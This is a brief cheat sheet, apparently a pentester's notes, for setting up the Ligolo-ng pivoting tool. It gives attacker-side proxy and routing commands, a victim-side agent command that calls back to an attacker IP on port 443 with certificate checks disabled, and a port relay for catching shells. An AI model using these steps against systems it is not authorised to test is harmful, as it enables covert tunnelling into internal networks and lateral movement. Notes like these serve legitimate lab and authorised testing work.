#Ligolio-ng

https://github.com/nicocha30/ligolo-ng/releases/tag/v0.4.4

## Setup
Attack Machine:
sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up && ./proxy -selfcert -laddr 0.0.0.0:443
sudo ip route add 192.168.110.0/24 dev ligolo

Victim Host:
./agent -connect {{IP}}:443 -ignore-cert

start

## Catching shells, services, ports etc.
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
